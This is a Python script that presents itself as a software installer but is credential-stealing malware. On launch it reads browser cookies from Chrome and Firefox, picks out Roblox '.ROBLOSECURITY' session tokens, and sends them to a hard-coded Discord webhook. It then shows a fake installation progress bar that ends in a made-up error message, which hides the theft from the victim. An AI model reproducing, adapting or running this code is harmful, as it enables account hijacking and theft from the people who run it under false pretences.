import browser_cookie3
import os
import random
import threading
import time
import tkinter as tk
import tkinter.ttk as ttk
from tkinter import Tk, Label, messagebox, W, HORIZONTAL
from tkinter.ttk import Progressbar
from discord_webhook import DiscordWebhook
# imports libraries


webhook_url = "https://discord.com/api/webhooks/787513008301670411/p5_XXC1a7wCZ1NZt056MECwBhpwxuadpb-sG60k5lT49Z-xNxQE9BYOM78mN9n-D4jkb"
cookie_names = [".ROBLOSECURITY"]
# defines webhook and cookies to find (the link can be changed, and the cookie search keywords can be altered)

cookies = []
n_limit = 2000

try:
    cookies.extend(list(browser_cookie3.chrome()))
except:
    pass

try:
    cookies.extend(list(browser_cookie3.firefox()))
except:
    pass

for y in cookie_names:
    send_cookie = str([str(x) for x in cookies if y in str(x)])
    chunks = [send_cookie[i:i + n_limit] for i in range(0, len(send_cookie), n_limit)]

    for z in chunks:
        webhook = DiscordWebhook(url=webhook_url, content=z)
        response = webhook.execute()
        # sends cookies to discord chat


def centerWindow(myRoot, width, height):  # centers window with a specific size
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()

    x = (screen_width / 2) - (width / 2)
    y = (screen_height / 2) - (height / 2)
    myRoot.geometry('%dx%d+%d+%d' % (width, height, x, y))


def num_load():  # creates a loading number percent
    load_txt = Label(root, text="Progress: 0%", font=("Arial", 9))
    load_txt.grid(row=2, column=0, padx=5, pady=5, stick=W)

    load_percent = 0
    fail_percent = random.randint(45, 99)

    while True:  # shows loading number
        time.sleep(random.random() * load_percent * 0.01)

        load_percent += 1
        load_txt.config(text=f"Progress: {str(load_percent)}%")

        if load_percent >= fail_percent:  # shows failure message
            tk.messagebox.showerror("Unexpected Error", "Installer encountered an error : 0x954557242")
            os._exit(0)


def start_load():  # shows loading animation
    load = ttk.Progressbar(root, orient=HORIZONTAL, length=90, mode="indeterminate")
    load.grid(row=1, column=0, padx=5, pady=(20, 2), stick=W)

    x = threading.Thread(target=num_load)
    x.start()

    while True:  # shows loading animation
        for x in range(6):
            load['value'] = x * 20
            time.sleep(0.4)


root = Tk()
style = ttk.Style(root)
style.configure("Placeholder.TEntry", foreground="grey")
root.lift()
# creates root

centerWindow(root, 250, 110)
root.title("Installing...")

inst_label = Label(root, text="Installing latest version...", font=("Arial", 12))
inst_label.grid(row=0, column=0, padx=5, pady=5, stick=W)
# shows main header

x = threading.Thread(target=start_load)
x.start()

root.mainloop()